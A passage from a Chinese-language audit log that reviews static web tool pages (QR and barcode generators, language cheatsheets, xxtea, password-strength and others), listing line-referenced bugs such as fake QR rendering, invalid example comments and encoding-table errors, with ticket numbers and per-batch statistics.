- 方法：逐页通读 HTML 与全部内联 JS；用 node 复刻 `ascii-tree-generator` 的 `build()` 验证子树丢失、统计 `barcode-code39` 表每字符元素数/宽元素数与生成模块数；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Y 批 · IT 速查/生成（2026-11-04）

**逐页结论（8 页，均通读 HTML 与全部内联 JS）**
- `tools/it/emoji-cheatsheet.html`：搜索、分类、柱状图均实时遍历 `EMOJIS` 生成，确属数据驱动；但数据表有 8 组重复 emoji，统计按条目重复计数。
- `tools/it/java-cheatsheet.html`：搜索、分类、图表均遍历 `COMMANDS` 生成，可用；4 处示例用了 Java 非法的 `--` 注释。
- `tools/it/kubernetes-yaml-generator.html`：Deployment + Service 模板缩进与嵌套合法；端口、名称、镜像未做合法性校验，非法输入原样拼入 YAML。
- `tools/it/location-qr.html`：**伪二维码**——不编码 geo 载荷，只画三个定位角、定时线与哈希噪点，扫码不可能得到坐标。
- `tools/it/lorem.html`：words/sentences/paragraphs 三种主流程可用；词数边界、预设/历史回调、中文占位承诺三处有缺陷。
- `tools/it/markdown-lint.html`：标题跳级/重复标题/列表缺空格/空链接 4 条规则真实现；承诺的行尾空格、代码块语言未实现，且行首强调符号会误报。
- `tools/it/nato-alphabet.html`：26 字母映射覆盖完整，正/反向均可跑；`X-ray` 反查失败、字母计数不准。
- `tools/it/nginx-cheatsheet.html`：搜索、分类、柱状图/明细表均遍历 `COMMANDS` 生成，可用；配置示例含非法 `--` 注释与永不成立的 `$https` 判断。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
| --- | --- | --- |
| `tools/it/location-qr.html` | `renderQR()`（264-283）不编码任何数据：固定 25×25 网格，仅 266-275 行画三个定位角、276 行画定时线，277-282 行用 `strHash(text)` + LCG 给其余模块填 0/1；没有数据位、格式信息、纠错码与掩码，扫码无法还原 262 行的 `geo:` 载荷。页面 10、161、203 行却承诺「扫码可在地图打开位置」——伪二维码（假功能） | IT-N521 |
| `tools/it/location-qr.html` | `buildGeo()`（259-260）经纬度仅 `parseFloat(v)||0`，未校验范围：输入 `999` 会生成 `geo:999,999`，非数字则静默变 `geo:0,0`，均被系统地图拒识；`generate()`（292-293）照样渲染，无任何提示 | IT-N522 |
| `tools/it/lorem.html` | words 分支（333-341）在 `startLorem` 时固定先塞 `['lorem','ipsum']`，`count=1` 实际输出 2 词（node 复刻确认），违反 155 行「数量 = count」；手输 `count=-5`（min=1 拦不住键入）时 332 行循环不执行，输出空串 | IT-N523 |
| `tools/it/lorem.html` | 预设栏回调（495）与历史记录恢复回调（443）都接 `downloadTxt()` 而非 `generate()`：点预设只改输入并下载旧文本，点历史记录同样触发下载且结果区不重算——预设/历史「算了不渲染」 | IT-N524 |
| `tools/it/lorem.html` | 199 行承诺「支持中文占位文本」、160 行承诺「可指定…句长范围」，但页面无中文/句长控件；`chineseTexts`（282-293）与 `randomChineseSentence`（323-325）无任何调用，为死代码（承诺未实现） | IT-N525 |
| `tools/it/markdown-lint.html` | 108 行「检查项」声称含「行尾多余空格」「代码块是否标注语言」，但 `calcTool()`（213-231）只实现标题跳级、重复标题、列表符号缺空格、空链接；行尾空格、代码块语言、110 行提到的 MD013 行宽均未实现（承诺未实现） | IT-N526 |
| `tools/it/markdown-lint.html` | 228 行 `/^\s*[-*]\S/` 把行首 `*斜体*`、`**加粗**` 当作「列表符号后缺空格」（node 复刻两处均误报）；同时循环不识别围栏代码块，代码块内 `# 注释` 会被计为标题并参与 219-226 行的层级/重复计数——误报 | IT-N527 |
| `tools/it/kubernetes-yaml-generator.html` | 231 行 `Math.floor(num('port'))||80` 只兜底 0/NaN：负数与超 65535（如 -1、70000）原样写入 `containerPort`/Service `port`；229 行名称仅 `trim()`，未按 DNS-1123 校验，含大写、空格或 `: ` 时 233 行生成非法 YAML，`kubectl apply` 必拒；镜像同理由 230 行原样拼接 | IT-N528 |
| `tools/it/nato-alphabet.html` | 反查 287 行先 `replace(/[^a-z]/g,'')` 再查 288 行 `REV`：`X-ray` 变成 `xray`，而 261 行 `REV` 的键是 `x-ray`，于是 290 行返回 `?`；`X` 唯一带连字符的码词无法反解（错误结果） | IT-N529 |
| `tools/it/nato-alphabet.html` | 283 行 `raw.replace(/\s/g,'').length` 把标点、数字、汉字都算作「字母」：`Hello, World!` 显示 12 个字母（实际 10 个）；反查 293 行也把未能解析的 `?` 计入音标词数（算错） | IT-N530 |
| `tools/it/nato-alphabet.html` | 公式 111 行称命中输出「字母=音标词」，115 行列出数字专用读法（3→Tree、9→Niner），但 272-281 行构造的 `parts`/`all` 从未渲染，283 行结果区只显示计数；278 行数字原样保留、282 行标点/CJK 原样透传，均未按承诺转换（承诺未实现） | IT-N531 |
| `tools/it/emoji-cheatsheet.html` | `EMOJIS` 表存在重复条目：🤩 315/330、😎 328/354、🥳 331/353、🤓 327/355、🍺 526/532、❌ 800/826、☔ 862/864、❇️ 836/838；`ec_groups()`（1025-1031）按条目累加、913 行「共 N 个」也按条目，柱状图与总数对同一 emoji 重复计数（算错） | IT-N532 |
| `tools/it/java-cheatsheet.html` | Java 没有 `--` 行注释：示例 341 行 `-- 增强 for`、405 行 `-- 方法引用`、445 行两处 `-- "Alice"`/`-- true`、509 行 `-- 10`，复制后 `--` 被解析为递减运算符，直接编译失败（错误结果） | IT-N533 |
| `tools/it/nginx-cheatsheet.html` | nginx 注释符是 `#` 不是 `--`：445 行 `client_max_body_size 20m;  -- 上传大文件`、469 行 `access_log off;  -- 关闭` 会被当作未知指令，541 行 `nginx -s reopen  -- 重开日志` 参数非法；复制进配置后 `nginx -t` 失败（错误结果） | IT-N534 |
| `tools/it/nginx-cheatsheet.html` | 509 行示例 `if ($https = off)` 永不成立——nginx 的 `$https` 只有 `on` 或空值，不会取 `off`，HTTP→HTTPS 跳转永远不触发（应判 `$scheme = http` 或 `$https != on`）；示例与 408-413 行 `ssl_redirect` 条目自相矛盾（错误结果） | IT-N535 |

**统计**
- 页数：8（`emoji-cheatsheet`、`java-cheatsheet`、`kubernetes-yaml-generator`、`location-qr`、`lorem`、`markdown-lint`、`nato-alphabet`、`nginx-cheatsheet`）。
- 问题：15 条——高 1（IT-N521）/ 中 14（IT-N522–IT-N535）。
- 编号区间：IT-N521–IT-N535，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：1 个（`tools/it/location-qr.html`，IT-N521，伪二维码噪点）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户输入均经 `escapeHtml`/`escH` 或仅写入 `textarea.value`/`canvas`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；用 node 复刻 `markdown-lint` 的 `calcTool()`、`lorem` 的 words 分支与 `nato-alphabet` 的反查/计数，确认误报与边界；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Z 批 · IT 校验/速查（2026-11-04）

**逐页结论（8 页，均通读 HTML 与全部内联 JS）**
- `tools/it/password-strength.html`：熵、字符集、检查项与破解时间均实时计算；但三档破解时间标签与实际速率不符，且「强度等级」用 6 项清单评分，未按公式声明的熵阈值判读。
- `tools/it/python-cheatsheet.html`：搜索、分类、柱状图与明细表均遍历 `COMMANDS` 生成，可用；15 条示例用 Python 非法的 `--` 注释，复制即语法错误。
- `tools/it/redis-cheatsheet.html`：常用命令、数据结构、事务、Stream、Lua 条目覆盖完整；4 条示例的 `-- 注解` 会被 redis-cli 当作参数，复制执行报错。
- `tools/it/rust-cheatsheet.html`：条目筛选、分类统计正常；5 条示例用 `--` 注释、2 条用 `...` 占位，且部分片段缺少上下文，复制不可编译。
- `tools/it/screen-size.html`：PPI、物理宽高、长宽比与点距计算正确；公式框声明的「屏幕面积」从未计算输出。
- `tools/it/summary-generator.html`：分句、词频、长度/位置/关键词权重与压缩率均已实现；长文本下 5% 句频阈值可把关键词全部滤掉，导致权重全 0、摘要退化为前 N 句。
- `tools/it/svg-placeholder-generator.html`：宽高钳制、字号、SVG 转义、复制与下载可用；历史记录回填后调用的是 `downloadSvg()` 而非 `render()`，结果区不重算还会触发下载。
- `tools/it/team-name-generator.html`：词库随机组合真实可用、输出经 `escapeHtml`；页面只有「领域」与「数量」，meta/公式/FAQ 承诺的风格、长度、数字后缀与语言切换均无对应控件。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/password-strength.html` | `:448-452` 以 `seconds=combos/(1e10*2)`（即 2×10¹⁰ 次/秒）为基准，却把三档标成 10 亿/秒、1000 亿/秒、1 万亿/秒并用 `/100`、`/100000` 换算，实际速率变成 2×10¹² 与 2×10¹⁵ 次/秒。node 复刻默认 `ToolBox@2026`（78 bit）：首行显示 479 千年（按 10 亿/秒应约 1000 万年）、第三档显示 4 年（按 1 万亿/秒应约 9584 年），分别约偏短 20/20/2000 倍（算错） | IT-N536 |
| `tools/it/password-strength.html` | `:161` 公式框写「判读：<40 弱｜40~60 中｜60~120 强｜≥120 极强」，但 `:437-440` 只用 6 项清单得分映射等级，从未比较熵值；如 32 个 `a` 熵为 150（公式应判「极强」），实际得分 3 →「一般」（承诺未实现/说明与实现矛盾） | IT-N537 |
| `tools/it/password-strength.html` | `:430` 的键盘序列正则以 `^` 锚定，只在密码开头匹配；`xxqwe123`、`Tq7!abc123` 等中段序列不会被 `:433` 的风险提示命中，`:349` 的同类检查亦同（错误结果） | IT-N538 |
| `tools/it/python-cheatsheet.html` | 15 条示例共 32 处用 `--` 作为行内注释（`:277`、`:293`、`:301`、`:309`、`:325`、`:341`、`:357`、`:373`、`:413`、`:453`、`:469`、`:485`、`:517`、`:525`、`:533`）；Python 无 `--` 注释，`:571` 渲染「复制」按钮、`:584-593` 原样复制 textContent，粘贴即 `SyntaxError`；`:453` 的裸 `raise` 也缺少 `except` 上下文（错误结果） | IT-N539 |
| `tools/it/python-cheatsheet.html` | `:435` 语法字段写成 `@dataclass class C:`，装饰器必须独立成行，照此书写会报语法错误；`:469` 示例 `from . import helper` 仅在包内有效，独立脚本复制后报 `ImportError`（错误结果） | IT-N540 |
| `tools/it/rust-cheatsheet.html` | 5 条示例共 7 处用 `--` 作注释（`:280` 两处、`:312`、`:328` 两处、`:392`、`:448`）；Rust 没有 `--` 运算符（注释须用 `//`），`a + b  -- 末尾无分号即返回` 等原样复制无法编译（`:523-532` 的复制按钮原样输出）（错误结果） | IT-N541 |
| `tools/it/rust-cheatsheet.html` | `:352`、`:368` 示例用 `...` 作代码占位，Rust 表达式位置无此语法；`:392` 的 `let n = parse("1")?;` 位于顶层且未导入 `ParseIntError`，`:392` 片段脱离 `fn -> Result` 上下文也不可用（错误结果） | IT-N542 |
| `tools/it/redis-cheatsheet.html` | 4 条示例把 `-- 注解` 写进命令：`:309`（`PING  -- 返回 PONG`）、`:357`、`:885`、`:925`；redis-cli 不支持行内注释，`PING`/`TYPE`/`EXEC`/`OBJECT ENCODING` 会收到多余参数报 `wrong number of arguments`，`:971`/`:984` 的复制按钮原样输出（错误结果） | IT-N543 |
| `tools/it/redis-cheatsheet.html` | `:736-741` 的 SINTER/SUNION/SDIFF 条目 params 写「STORE 可存结果」，但这三个命令不接受 `STORE`，需改用 `SINTERSTORE`/`SUNIONSTORE`/`SDIFFSTORE`；照 params 书写会报语法错误（错误结果） | IT-N544 |
| `tools/it/screen-size.html` | `:130` 公式框声明「屏幕面积 = 物理宽 × 物理高」，但 `calc()`（`:178-209`）只输出分辨率、PPI、长宽比、物理宽高与点距，`:198-207` 无面积字段（承诺未实现） | IT-N545 |
| `tools/it/summary-generator.html` | `:551-558` 用 `freq[w]/total > 0.05` 过滤关键词，公式 `:212` 只说明剔除停用词、未披露该阈值；node 复刻 60 句唯一文本得 0 个关键词、60 句权重全 0，`:636-641` 退化为按原序取前 N 句（错误结果） | IT-N546 |
| `tools/it/summary-generator.html` | `:481-505` 的分句器除 `. ! ?` 外还按 `…`、`、` 与换行（当前段 ≥20 字）切分，且小数点后为数字时照切（如 `价格 3.14 元` 被切成 `价格 3.`）；公式 `:212` 只承诺「遇 . ! ? 切分」，句数与摘要片段均可能失真（错误结果） | IT-N547 |
| `tools/it/svg-placeholder-generator.html` | 历史记录恢复回调 `:340-354` 在回填输入后调用 `:351` 的 `downloadSvg()` 而非 `render()`；`:405-408` 又把 `downloadSvg` 包成带历史写入的函数，点历史记录只下载旧 SVG，`:142` 的预览与 `:141` 的结果区都不重算（算了不渲染） | IT-N548 |
| `tools/it/team-name-generator.html` | meta `:10` 承诺「可设风格与长度」，公式 `:158-159` 写「风格下拉」及「热血、搞笑、专业、古风」「可追加数字或符号后缀」，FAQ `:210` 称「可切换语言风格」，英文简介 `:470` 称含 optional numbers；实际 `:163-169` 只有「领域」下拉（科技/体育/电竞/创业/创意），`:274` 只追加词库后缀，全页无风格/长度/语言/数字后缀控件（承诺未实现） | IT-N549 |

**统计**
- 页数：8（`password-strength`、`python-cheatsheet`、`redis-cheatsheet`、`rust-cheatsheet`、`screen-size`、`summary-generator`、`svg-placeholder-generator`、`team-name-generator`）。
- 问题：14 条——高 1（IT-N536）/ 中 13（IT-N537–IT-N549）。
- 编号区间：IT-N536–IT-N549，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：0 个（无整页伪工具；IT-N545、IT-N549 为承诺未实现，已计入中）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；`password-strength.html:542` 的 localStorage 持久化选择器显式排除 `input[type=password]`，密码未落盘；其余用户输入均经 `escapeHtml`/`escH` 或仅写入 `textContent`/`value`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；node 复刻 `password-strength` 的熵/破解时间换算（确认标签倍率偏差）与 `summary-generator` 的 5% 句频过滤（60 句唯一文本过滤后 0 关键词、60 句权重全 0）；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Z 批 · IT 编码/速查（二）（2026-11-04）

逐页结论（5 页）：

- `tools/it/text-qr.html`：2 条（IT-N550 高、IT-N551 中）。页面能画出定位图形，但数据区是伪随机噪声，text 只当种子，不是二维码编码；承诺的尺寸/容错/配色与 PNG/SVG 下载均无控件。
- `tools/it/tmux-cheatsheet.html`：2 条（IT-N552、IT-N553 中）。39 条速查与搜索/分类/图表均可用；问题在示例与参数说明的可复制性。
- `tools/it/unicode-lookup.html`：3 条（IT-N554–IT-N556 中）。逐字符码点浏览、UTF-8/UTF-16 换算与区段遍历正确；码点/名称检索未实现、名称字段写死、特定字符的复制按钮失效。
- `tools/it/username-generator.html`：1 条（IT-N557 中）。词根随机组合、数字/下划线/Leet/前缀与长度截断可运行，输出经 `escapeHtml`；「风格」承诺无对应控件。
- `tools/it/xxtea.html`：2 条（IT-N558 高、IT-N559 中）。加解密算法本体正确（node 复刻 1–255 字节逐长度往返一致）；缺陷在长度字只取低 8 位导致长文本解密截断，以及超长密钥静默丢弃。

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/text-qr.html` | 伪二维码：`renderQR` `:247-267` 只按 `:249-257` 画 3 个定位图形、`:259` 画定时线，数据区 `:260-265` 用 `pseudoRandom(strHash(text))` 逐格 `rnd()<0.5` 填黑白，全程无模式分段/比特流/Reed-Solomon/格式信息/掩码；`text` 仅作随机种子，生成图形不含任何可扫描数据。`:248` 的 `N=29` 写死，版本不随内容增长（V3 容量约 32 字节）（高·伪生成） | IT-N550 |
| `tools/it/text-qr.html` | meta `:10` 与 og `:15` 承诺「支持尺寸、容错与配色调节，一键下载 PNG/SVG」；实际 `:160-165` 只有文本框与「生成 / 导出明细 CSV / 复制」三个按钮，无尺寸/纠错等级/配色控件，无 `toDataURL`/`toBlob`/SVG 导出路径，CSV 导出的是历史表（承诺未实现） | IT-N551 |
| `tools/it/tmux-cheatsheet.html` | 示例混入 `--` 行内注释（全页 29 行示例，可执行命令集中在 `:280`、`:304`、`:312`、`:520`、`:552`）：`tmux  -- 匿名会话`、`tmux kill-server  -- 关闭所有 tmux`、`tmux kill-session -a  -- 关闭除当前外所有`、`set -g mouse on  -- 在 .tmux.conf 中`；shell/tmux 无 `--` 注释语法，`--` 及其后中文被当作参数，粘贴后报 `unknown command`/`usage: kill-session`，`:606` 渲染、`:619-628` 实现的复制按钮原样输出（错误结果） | IT-N552 |
| `tools/it/tmux-cheatsheet.html` | `:295` 把 `tmux a` 的 `-d` 写成「不接管」，实际 `attach -d` 是分离其它已连接客户端、由本客户端接管，语义相反；`:304`「关闭除当前外所有」示例写成 `tmux kill-session -a` 未带 `-t`，在 tmux 外执行因无当前会话直接报错（错误结果） | IT-N553 |
| `tools/it/unicode-lookup.html` | 码点/名称检索未实现：`:172` 占位符写「输入字符、码点或字符名」，`:161` 公式与深度解析 `:221` 举例 `U+2603`→`☃`、`snowman` 可命中；实际 `render()` `:292-299` 对输入 `for (const ch of q)` 逐字符取码点，`U+2603` 被拆成 `U`/`+`/`2`/`6`/`0`/`3` 六格，`snowman` 拆成 7 个字母，码点与名称永远不会被解析（承诺未实现/死输入） | IT-N554 |
| `tools/it/unicode-lookup.html` | 名称字段写死常量：`lookupName` `:346-355` 仅 11 条硬编码映射（`0x21`/`0x22`/`0x23`/`0x40`/`0x00A9`/`0x00AE`/`0x2122`/`0x2603`/`0x2605`/`0x2665`/`0x2660`），其余一律返回 `Code Point N`；meta `:10` 承诺「展示名称」，而区段中 99% 以上字符的名称是常量占位（写死常量） | IT-N555 |
| `tools/it/unicode-lookup.html` | `escapeAttr` `:389` 仅把 `'` 转成 `\'`，未处理 `"` 与 `\`；`:341` 生成 `onclick="copy('${escapeAttr(ch)}')"`，详情为 U+0022（`"`）时双引号提前闭合属性、U+005C（`\`）时反斜杠吞掉收尾引号，onclick 语法错误、按钮点击无反应（错误结果） | IT-N556 |
| `tools/it/username-generator.html` | 「风格」承诺未实现：meta `:10`「可设长度与风格」、公式 `:163`「可控制长度、风格（简短/专业/趣味）」；`:169-186` 的控件只有关键词、数量、最大长度与加数字/下划线/Leet/前缀四个开关，`generate` `:274-299` 也无风格分支，全页无风格下拉或权重（承诺未实现） | IT-N557 |
| `tools/it/xxtea.html` | ≥256 字节明文解密被截断且仍提示成功：`longToBytes` `:290-296` 用 `:292` 的 `m = v[n-1] & 0xff` 取回长度，长度字只保留低 8 位；`:383` 解密走同一路径。node 复刻（同页算法）1/10/100/254/255 字节往返一致，**256 字节→0 字符、300 字节→44 字符、400 字节→144 字符**（按 256 取模），`:385` 仍 toast「解密成功」（高·错误结果） | IT-N558 |
| `tools/it/xxtea.html` | 超长密钥静默丢弃：`:350` 的 `keyToLongs` 不归一化，`:304-311` 的 `fixKey` 只在不足 4 字时补零、不截断，而 `:324`/`:327` 仅索引 `k[(p & 3) ^ e]`（恒为 0–3），第 5 个及以后字永不参与；`:185` 占位符却写「任意长度」。node 验证前 16 字节相同的两组 20 字节密钥（`abcdefghijklmnopQRST` 与 `abcdefghijklmnopXXXX`）产生完全相同密文（密钥处理/错误结果） | IT-N559 |

**统计**
- 页数：5（`text-qr`、`tmux-cheatsheet`、`unicode-lookup`、`username-generator`、`xxtea`）。
- 问题：10 条——高 2（IT-N550、IT-N558）/ 中 8（IT-N551–IT-N557、IT-N559）。
- 编号区间：IT-N550–IT-N559，连续且无重号、无跳号（与上批 IT-N536–IT-N549 衔接）。
- 假工具：0 个（无整页空壳；text-qr 有真实 UI 与历史模板，但核心渲染为伪生成，已计高）。
- 安全条目：0 条——本批页面未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/可控 DOM 注入点（`text-qr` 的文本经 `escapeHtml`，`tmux` 全字段经 `escapeHtml`，`unicode-lookup` 注入的 name 取自硬编码表）；`xxtea` 密钥与明文仅存内存，未落 localStorage。全站公共模板的 `ttzz`（bytegoofy）第三方脚本非本批页面特有，未计入。
- 方法：逐页通读 HTML 与全部内联 JS；`node -e` 内存复刻 `xxtea` 的 `longToBytes`/`bytesToLong`/加解密（未落盘、未建文件），逐长度核对往返与密钥前缀碰撞；`text-qr` 伪编码按源码判定（无分段/纠错/格式信息/掩码）；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## AA 批 · IT 深度复扫：QR/条码同族实现矩阵（2026-11-04）

> 范围：`tools/it/` 下 10 页（QR 族 5 + 一维条码族 5）。只读源码 + `node -e` 内存复算（比对 EAN G 表、Code39 元素数、Code128 符号表、`unescape` 行为），未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改 `tools/**`/js/css/json 或构建产物。伪实现 3 页沿用既有编号（IT-N520/N521/N550），本批不重复开单；新问题从 IT-D01 起。

### 同族实现矩阵

| 页面 | 真实编码 | 伪实现 | 校验位 | 纠错 | 可扫码 | 结论 / 编号 |
|---|---|---|---|---|---|---|
| `tools/it/qrcode.html` | 是（模式分段+RS+掩码+格式信息，复用 `js/qrcode.js`） | 否 | 是（格式信息 BCH + RS 码字） | 是（L/M/Q/H Reed-Solomon） | 是 | **唯一真 QR 编码页**；`:428-435` 调库；表 L 列 v9/v10 错（IT-D02）、默认 Byte 模式（IT-D03）、容量图超限仍标 10（IT-N260） |
| `tools/it/email-qr.html` | 否 | 是 | 无 | 无 | 否 | `:262-282` 固定 29×29，仅 3 定位角+时序线，`:275-280` LCG 噪点；无数据/格式/掩码（IT-N520 高） |
| `tools/it/location-qr.html` | 否 | 是 | 无 | 无 | 否 | `:264-283` 固定 25×25 同型噪点（IT-N521 高）；坐标范围不校验（IT-N522） |
| `tools/it/text-qr.html` | 否 | 是 | 无 | 无 | 否 | `:247-267` 固定 29×29，`text` 只作随机种子（IT-N550 高） |
| `tools/it/qr-decoder.html` | 不适用（不做图像解码） | 否 | 不适用 | 不适用 | 不适用 | `:266-345` 是按前缀解析文本的真实逻辑，不是二维码解码器；`:149`/`:152` 英文与公式误称「图像/摄像头解码」（IT-D06） |
| `tools/it/barcode-code128.html` | 是（107 符号+Start A/B/C+13 模块 Stop） | 否 | 是（加权 mod 103） | 无（一维码规范无纠错） | 是（静区偏窄） | 唯一直接复用 `js/barcode-lib.js:22-98` 的 1D 页；静区单位错位（IT-D08） |
| `tools/it/barcode-ean.html` | 部分（95 模块、保护线/奇偶表齐全） | 否 | 是（mod 10，`:250-253`） | 无 | 否（首位≠0） | `:246` G 表由 L 表反转，实为标准 G 的反码；`:273` 用于左侧 → 默认码奇偶校验失败（IT-D01 高） |
| `tools/it/barcode-upc.html` | 是（95 模块 L/R、保护线） | 否 | 是（mod 10；12 位输入不校验，IT-N128） | 无 | 是（静区仅 3.3 模块） | `:252-262` 编码结构正确；补零/截断（IT-N127）、首位未印左静区（IT-N129）仍在 |
| `tools/it/barcode-code39.html` | 否（字符表每项 15 元素，标准 9 元素） | 是（形态像 Code39，内容非 Code39） | 无（承诺 Mod 43 未实现，IT-N508） | 无 | 否 | `:246-262` 表错、`:263-294` 按 15 元素生成（IT-N507）；静默丢字符（IT-N509） |
| `tools/it/barcode-msi.html` | 部分（有 4 bit 映射，位宽/元素数不符标准） | 否 | 无（承诺 Mod 10/11/1010 未实现，IT-N510） | 无 | 否 | `:247-258` 每 bit 固定「条+空」、`1` 为 3 模块宽条，与 `:156` 公式不符（IT-N512）；显示与编码不一致（IT-N511） |

**核心差异**：QR 族 5 页里**只有 `qrcode.html` 一页做了真实现**——`email-qr`/`location-qr`/`text-qr` 三页全是「定位符 + 伪随机点阵」，`qr-decoder` 只是文本前缀解析器。一维族 5 页里**只有 `code128` 直接复用共享库**；`upc` 手写但结构正确，`ean` 手写且 G 表反相（默认不可扫），`code39`/`msi` 手写且不符合规范。
**重写线**：`email-qr`、`location-qr`、`text-qr` 改用 `js/qrcode.js`（按 byte/UTF-8 写入并保留 4 模块静区）。
**修复线**：`barcode-ean` → `B.encode('ean13')`；`barcode-code39` → `B.encode('code39')`；`barcode-msi` 重写位宽并补校验位；`qr-decoder` 要么补图像解码，要么删除 `:149`/`:152-157` 的图像解码宣称。

### 逐页结论

- `qrcode.html`：真编码。除 IT-N260（超 V10 一律标 10）外，本批新增两处：数字容量表 L 列 v9/v10 取值错（IT-D02），以及未指定编码模式导致纯数字也走 Byte（IT-D03）。IT-N258 的 UTF-8 问题已由 `:430-432` 修复（`stringToBytes` 已切 UTF-8），可销案。
- `email-qr.html`：假二维码，且无尺寸/容错/下载控件；扫码得不到 `mailto:`（IT-N520）。
- `location-qr.html`：假二维码；`buildGeo` 仅 `parseFloat(v)||0`，非法/非数字坐标仍绘制（IT-N522）。meta `:10` 承诺「输入经纬度或地址」，实际只有经纬度两个框，地址文本会被归零。
- `text-qr.html`：假二维码；版本固定 29，`text` 只影响噪点种子（IT-N550）。
- `qr-decoder.html`：前缀解析逻辑真实（WIFI/mailto/tel/sms/geo/http/vCard/VEVENT），但不是图像解码器；WiFi 百分号解码用 `unescape`（IT-D04）、不识别 `SMSTO:`（IT-D05）、英文/公式误称图像解码（IT-D06）、NaN 守卫误吞结果（IT-D07）。
- `barcode-code128.html`：编码表/校验/Stop 均正确，是 1D 族唯一可直接信任的页；问题是静区按像素计（IT-D08）与既有的空输入回退空格（IT-N125）。
- `barcode-ean.html`：长度与校验位校验已补齐（IT-N73/N84 的旧证据已失效，勿按旧结论返工），但 G 表反相使默认 `6901234567892` 与所有首位 1–9 的码不可扫（IT-D01）。共享库 `js/barcode-lib.js:103-104` 的 EAN_G 是正确的，本页却未加载该库。
- `barcode-upc.html`：L/R 与保护线正确，默认 `03600029145` 自动补校验位 `2`，结构合法；12 位输入不比对第 12 位（IT-N128）、空/短输入补零（IT-N127）、首位未单印左静区（IT-N129）仍在。
- `barcode-code39.html`：`:246-262` 每字符 15 个宽窄元素、宽元素 4–7 个（规范 9 元素、恰 3 个宽元素），生成图非 Code 39（IT-N507）；无 Mod 43（IT-N508）、静默丢字符（IT-N509）。
- `barcode-msi.html`：位宽映射与自身公式不符（IT-N512），无任何校验位（IT-N510），非数字静默剥离且显示原文（IT-N511）。

### 三角度抽查

- **默认值**：EAN 默认 `690123456789` → 校验位 2、首位 6（奇偶 `LGGGLL`），左侧 3 位走错误 G 表 → 默认输出即不可扫（IT-D01）。UPC 默认 `03600029145` → `036000291452` 校验位正确。Code128 默认 `ABC-1234` 合法。Code39 默认 `CODE-39` 字符合法但 15 元素表使图不可扫。MSI 默认 `1234567` 无校验（页面标为可选）。
- **倍率/单位**：Code39 固定 3:1（规范 2:1–3:1，合规）；MSI `1` 编成 3 模块宽条（与公式「宽条窄空」不符）；条码模块宽 2–3 px 合理；QR 真页按 `pixelSize/moduleCount` 取整（`:439-465`），伪页固定 8 px/格。静区问题见 IT-D08。
- **表维度**：`QR_NUM_CAP` 仅 L 列 v9/v10 两格错（M/Q/H 与字节容量列逐项对 ISO 表正确）；EAN `PARITY` 表、UPC `L/R` 表、MSI 数字 4 bit 表维度均正确，错的是 EAN 的 G 表内容与 Code39 的 15 元素表结构。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/barcode-ean.html` | G 码表由 L 表逐位反转（`:246`），得到的是标准 G 的反码；`:273` 将其用于左侧第 2–7 位。默认 `6901234567892` 首位 6 → 奇偶 `LGGGLL`，第 3–5 位走错误 G，扫码器无法通过奇偶校验；只有首位 0（`LLLLLL`）不受影响。共享库 `js/barcode-lib.js:103-104` 的 EAN_G 正确，但本页未加载（`tools/it/` 下仅 `barcode-code128.html:28` 引 barcode-lib；另两处为 `tools/biz/barcode-generator.html` 与 `tools/science/barcode-pharmacode.html`）。 | IT-D01 |
| `tools/it/qrcode.html` | `QR_NUM_CAP.L` 第 9/10 项写成 511/604（`:530`），ISO/IEC 18004 数字模式 L 应为 552/652（v9 数据码字 232、v10 274）；同表 M/Q/H 与 L/M/Q/H 字节列逐项正确，仅 L 列这两格错位，容量速查表给错数。 | IT-D02 |
| `tools/it/qrcode.html` | `qr.addData(text)` 未传 mode（`:434`），`js/qrcode.js:388` 默认 `Byte`；公式 `:196` 却称「自动选最短」。20 位纯数字按 Byte 需 V2-L（32 字节），按数字模式 V1-L（41 位）即可；大写字母数字同理，版本/模块数被不必要抬高。 | IT-D03 |
| `tools/it/qr-decoder.html` | `wifiValue`（`:265`）用 `unescape` 解百分号：`unescape('%E4%B8%AD')` 得 `ä¸­`（Latin-1 逐字节），不是 UTF-8 的「中」；中文 SSID/密码显示乱码，用户照抄连不上。应改 `decodeURIComponent`。 | IT-D04 |
| `tools/it/qr-decoder.html` | 只匹配 `^sms:`（`:285`），而本站 `qrcode.html:217` 预设与 `sms-qr.html:156` 均输出 `SMSTO:号码:内容`；自家生成的短信二维码粘回来被判为「纯文本」，号码/正文都不提取。 | IT-D05 |
| `tools/it/qr-decoder.html` | `:149` 英文与 `:152` 公式写「Decode QR codes from an image or camera」「从图片中识别并解码二维码」，`:154-157` 还列出定位/采样/RS 纠错；实际控件只有文本框（`:163`），`decode()` `:266-345` 仅按前缀解析，无文件/相机/图像处理，英文态按说明使用必然扑空。 | IT-D06 |
| `tools/it/qr-decoder.html` | `:342` 的模板 NaN 守卫扫描 `decode()` 返回的、已拼入用户值的 HTML；正文/URL 含独立 `NaN` 或 `Infinity`（如 `mailto:...&body=NaN`、`WIFI:S:NaN;...`）即被替换成「⚠ 计算结果含无效值，请检查输入是否为有效正数」，解析结果整块消失。与 IT-N232 同型；`email-qr.html:293`、`text-qr.html:280` 同样中招。 | IT-D07 |
